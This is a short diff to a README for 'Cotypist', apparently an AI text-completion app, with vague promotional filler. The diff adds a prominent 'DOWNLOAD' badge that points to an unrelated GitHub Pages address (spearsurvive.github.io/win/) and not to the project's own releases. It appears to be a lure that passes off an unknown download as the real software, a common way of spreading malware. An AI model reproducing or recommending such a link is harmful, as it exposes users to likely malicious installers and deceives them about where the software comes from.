@@ -30,6 +30,12 @@ Cotypist runs a local language model and offers inline text completions in any a
 
 Whether you're a newcomer or a veteran, Cotypist provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Cotypist](https://img.shields.io/badge/⬇_DOWNLOAD_Cotypist-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
